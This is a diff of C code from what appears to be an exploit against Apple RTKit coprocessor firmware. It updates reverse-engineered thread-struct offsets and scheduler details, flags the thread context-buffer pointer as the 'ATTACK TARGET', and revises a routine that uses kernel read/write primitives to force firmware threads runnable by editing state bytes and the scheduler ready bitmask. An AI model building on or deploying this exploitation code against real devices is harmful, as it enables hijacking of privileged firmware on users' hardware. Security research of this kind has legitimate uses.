@@ -1038,30 +1038,46 @@ arm_sleeping_thread(struct rtk_thread_info *thread,
  * descriptor and change it from SLEEPING to RUNNABLE.
  */
 /*
- * RTKit thread state values (from firmware RE):
- *   0 = INVALID/FREE
- *   1 = RUNNABLE (ready to execute)
- *   2 = RUNNING  (currently executing)
- *   3 = SLEEPING (waiting for event/timer)
- *   4 = BLOCKED  (waiting on mutex/semaphore)
+ * RTKit thread struct layout (CONFIRMED from RTK_thread_create at 0xc2a8
+ * and scheduler at 0x923c):
  *
- * Thread struct offsets (confirmed from RTK_thread_create at 0xc2a8):
- *   +0x00: name pointer (or first word of inline name)
- *   +0x08: priority
- *   +0x10: state
- *   +0x18: stack base
- *   +0x20: stack size
- *   +0x28: entry point
- *   +0x30: arg
- *   +0x38: flags
- *   +0x40: scheduler data
- *   +0x48: frame pointer (context buffer)
- *   +0x50: next (linked list)
- *   ...
+ *   +0x00: (zeroed by memset at creation)
+ *   +0x10: thread ID (written to contextidr_el1 by scheduler at 0x9308)
+ *   +0x18: 0 (pad)
+ *   +0x20: name pointer (x0 arg to RTK_thread_create)
+ *   +0x28: current priority (byte)
+ *   +0x29: base priority (byte, w5 arg to RTK_thread_create)
+ *   +0x2A: state/flags (byte) — 0=normal/runnable, nonzero=blocked/yielding
+ *          Scheduler checks: ldrb w12,[thread,#0x2a]; cbz w12,... (at 0x9288)
+ *          Initial value: 0x00 (from halfword strh 0x100 at +0x2a → byte at 0x2a=0x00)
+ *   +0x2B: (high byte of halfword at +0x2a, initially 0x01)
+ *   +0x2C: flag (byte, initially 0)
+ *   +0x30: stack ownership (word: 0=provided, 2=allocated)
+ *   +0x38: stack base (pointer)
+ *   +0x40: stack size
+ *   +0x48: context buffer pointer ← ATTACK TARGET
+ *   +0x50: embedded linked list node
+ *   +0x70: list node self-ptr (→ +0x50)
+ *   +0x90: 0
+ *   +0x98: 0
+ *   +0xA0: 0
+ *   +0xA8: debug info
+ *   Size: 0xB0 (176 bytes)
+ *
+ * Scheduler thread selection (at 0x923c):
+ *   1. Read ready bitmask from 0x112d90 (64-bit)
+ *   2. CLZ to find highest priority bit set
+ *   3. Index into thread array at 0x112da0 (16-byte entries)
+ *   4. Load thread+0x48 → frame pointer
+ *   5. Check thread+0x2a — if nonzero, skip (blocked)
+ *   6. msr tpidrro_el0, frame_ptr
+ *   7. msr contextidr_el1, thread+0x10
  */
-#define RTK_THREAD_STATE     0x10
-#define RTK_STATE_RUNNABLE   1
-#define RTK_STATE_SLEEPING   3
+#define RTK_THREAD_STATE     0x2A   /* byte: 0=runnable, nonzero=blocked */
+#define RTK_THREAD_PRIORITY  0x28   /* byte: current priority */
+#define RTK_THREAD_ID        0x10
+#define RTK_STATE_RUNNABLE   0      /* scheduler checks cbz — 0 means go */
+#define RTK_STATE_BLOCKED    1
 
 /*
  * RTKit mailbox registers (SmartIO-specific).
@@ -1126,23 +1142,25 @@ wake_thread(struct rtk_thread_info *thread)
             fprintf(stderr, "    Found thread descriptor at phys 0x%llx (index %d)\n",
                     thr_phys, i);
 
-            /* Read current state */
-            uint32_t state = kread32(thr_phys + RTK_THREAD_STATE);
-            fprintf(stderr, "    Current state: %u (%s)\n", state,
-                    state == 1 ? "RUNNABLE" : state == 2 ? "RUNNING" :
-                    state == 3 ? "SLEEPING" : state == 4 ? "BLOCKED" : "?");
+            /* Read current state (byte at +0x2A) */
+            uint8_t state_byte;
+            kread(thr_phys + RTK_THREAD_STATE, &state_byte, 1);
+            fprintf(stderr, "    Current state byte: 0x%02x (%s)\n", state_byte,
+                    state_byte == 0 ? "RUNNABLE" : "BLOCKED/YIELDED");
 
-            /* Write RUNNABLE state */
-            kwrite32(thr_phys + RTK_THREAD_STATE, RTK_STATE_RUNNABLE);
-            fprintf(stderr, "    Set state → RUNNABLE\n");
+            /* Clear the state byte to 0 (RUNNABLE) */
+            uint8_t zero = 0;
+            kwrite(thr_phys + RTK_THREAD_STATE, &zero, 1);
+            fprintf(stderr, "    Set state byte → 0 (RUNNABLE)\n");
 
             /* Set ready bit in scheduler bitmask */
             uint64_t ready_bitmask_phys = smartio_carveout_phys + 0x112d90;
-            uint32_t ready = kread32(ready_bitmask_phys);
-            uint32_t prio = kread32(thr_phys + 0x08);  /* priority at +0x08 */
-            if (prio < 32) {
-                ready |= (1U << prio);
-                kwrite32(ready_bitmask_phys, ready);
+            uint64_t ready = kread64(ready_bitmask_phys);
+            uint8_t prio;
+            kread(thr_phys + RTK_THREAD_PRIORITY, &prio, 1);
+            if (prio < 64) {
+                ready |= (1ULL << prio);
+                kwrite64(ready_bitmask_phys, ready);
                 fprintf(stderr, "    Set ready bit %u in scheduler bitmask\n", prio);
             }
             break;
